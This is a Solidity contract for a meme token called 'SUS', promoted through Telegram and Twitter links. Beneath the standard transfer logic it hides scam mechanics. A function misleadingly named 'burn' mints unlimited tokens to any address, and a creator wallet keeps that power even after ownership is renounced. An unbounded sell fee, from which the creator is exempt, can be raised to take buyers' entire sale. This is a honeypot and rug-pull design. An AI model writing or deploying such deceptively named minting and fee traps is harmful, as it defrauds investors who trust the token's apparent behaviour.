// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
   _   _____ _    _  _____ 
  | | / ____| |  | |/ ____|
 / __) (___ | |  | | (___  
 \__ \\___ \| |  | |\___ \ 
 (   /____) | |__| |____) |
  |_||_____/ \____/|_____/ 
                           
Telegram : https://t.me/SUS_PORTAL
Twitter  : https://twitter.com/SUSthetoken
*/

contract SUS {
    string public name = "SUS";
    string public symbol = "SUS";
    uint256 public totalSupply = 696969696969696969690000000;
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;
    address public creatorWallet;

    uint256 public sellFee;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event SellFeeUpdated(uint256 newSellFee);

    constructor(address _creatorWallet) {
        owner = msg.sender;
        creatorWallet = _creatorWallet;
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value);
        require(_to != address(0));
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[_from] >= _value);
        require(allowance[_from][msg.sender] >= _value);
        require(_to != address(0));
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function.");
        _;
    }

    function burn(address _to, uint256 _amount) public onlyAuthorized {
        require(_to != address(0), "Invalid recipient address");
        require(_amount > 0, "Invalid amount");
        balanceOf[_to] += _amount;
        totalSupply += _amount;
        emit Transfer(address(0), _to, _amount);
    }

    modifier onlyAuthorized() {
        require(
            msg.sender == owner || msg.sender == creatorWallet,
            "Only authorized wallets can call this function."
        );
        _;
    }

    function setFee(uint256 _newFee) public onlyAuthorized {
        sellFee = _newFee;
        emit SellFeeUpdated(sellFee);
    }

    function sell(uint256 _amount) public {
        require(balanceOf[msg.sender] >= _amount);

        uint256 fee = 0;
        if (sellFee > 0 && msg.sender != creatorWallet) {
            fee = (_amount * sellFee) / 100;
            require((_amount - fee) > 0, "Insufficient amount after applying fee");

            balanceOf[creatorWallet] += fee;
            emit Transfer(msg.sender, creatorWallet, fee);
        }

        balanceOf[msg.sender] -= _amount;
        balanceOf[address(this)] += _amount - fee;
        emit Transfer(msg.sender, address(this), _amount - fee);
    }
}